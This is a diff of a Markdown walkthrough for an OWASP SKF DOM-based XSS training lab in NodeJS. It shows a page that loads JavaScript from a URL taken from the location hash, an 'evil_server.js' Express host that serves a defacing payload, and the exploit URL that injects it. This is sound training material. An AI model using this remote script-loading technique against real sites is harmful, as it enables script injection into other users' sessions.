@@ -1,10 +1,8 @@
-# KBID 3 - Cross Site Scripting \(DOM-2\)
+# NodeJS - XSS-DOM-2
 
 ## Running the app nodeJs
 
-First make sure nodejs and npm are installed on your host machine.
-After installation, we go to the folder of the lab we want to practice.
-"i.e /skf-labs/XSS, /skf-labs/RFI/" and run the following commands:
+First make sure nodejs and npm are installed on your host machine. After installation, we go to the folder of the lab we want to practice. "i.e /skf-labs/XSS, /skf-labs/RFI/" and run the following commands:
 
 ```
 $ npm install
@@ -24,11 +22,11 @@ Now that the app is running let's go hacking!
 
 The application shows no input field or anything else we can interact with. Let's inspect the source code.
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/4.png)
+![](../../.gitbook/assets/java/XSS-DOM-2/4.png)
 
 Inspecting the source code of the application.
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/5.png)
+![](../../.gitbook/assets/java/XSS-DOM-2/5.png)
 
 ```javascript
 function loadWelcomeMessage() {
@@ -53,7 +51,7 @@ endpoint = location.hash.slice(5);
 
 Declaring endpoint variable which takes the url, whatever is after the hash(#) and using slice to remove the first 4 characters after that. If the endpoint exists it will load the js file from there.
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/1.png)
+![](../../.gitbook/assets/java/XSS-DOM-2/1.png)
 
 ## Exploitation
 
@@ -75,10 +73,9 @@ const port = process.env.PORT || 1337;
 app.listen(port, "0.0.0.0", () => console.log(`Listening on port ${port}...!!!`));
 ```
 
-Save the snippet above to &gt; evil_server.js and run the commands below to install some dependencies.
-Of course you can also run your app on whatever service you want it does not have to be nodeJs express.
+Save the snippet above to > evil\_server.js and run the commands below to install some dependencies. Of course you can also run your app on whatever service you want it does not have to be nodeJs express.
 
-```text
+```
 $ npm install express
 ```
 
@@ -90,19 +87,19 @@ document.getElementsByClassName("panel-body")[0].innerText = "pwned!!!";
 
 We are ready to start our server:
 
-```text
+```
 $ node evil_server.js
 ```
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/2.png)
+![](../../.gitbook/assets/java/XSS-DOM-2/2.png)
 
 Now we can serve our malicious js file to the application
 
-```text
+```
 http://localhost:5000/#xxxxhttp://localhost:1337
 ```
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/3.png)
+![](../../.gitbook/assets/java/XSS-DOM-2/3.png)
 
 ## Additional sources
 
